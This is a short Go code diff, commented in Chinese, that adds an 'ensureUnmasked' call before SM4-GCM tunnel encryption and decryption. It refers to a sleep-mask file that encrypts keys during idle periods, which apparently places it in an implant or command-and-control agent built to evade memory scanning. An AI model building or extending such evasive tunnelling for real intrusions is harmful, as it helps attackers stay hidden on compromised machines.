@@ -274,6 +274,8 @@ func deriveSM4Key(encKey []byte) []byte {
 
 // sm4EncryptTunnel 用 SM4-GCM 加密隧道消息：随机 12B nonce + 密文 + 16B tag。
 func sm4EncryptTunnel(plaintext, key []byte) []byte {
+	// 休眠期隧道密钥可能被加密：先确保已还原（见 sleepmask_windows.go 的加密门）
+	ensureUnmasked()
 	nonce := make([]byte, sm4NonceSize)
 	_, _ = rand.Read(nonce)
 	buf := make([]byte, 0, len(plaintext)+sm4TagSize)
@@ -290,6 +292,7 @@ func sm4EncryptTunnel(plaintext, key []byte) []byte {
 
 // sm4DecryptTunnel 用 SM4-GCM 解密隧道帧：剥离 12B nonce 后校验并解密；认证失败返回 nil。
 func sm4DecryptTunnel(frame, key []byte) []byte {
+	ensureUnmasked()
 	if len(frame) < sm4NonceSize+sm4TagSize {
 		return nil
 	}
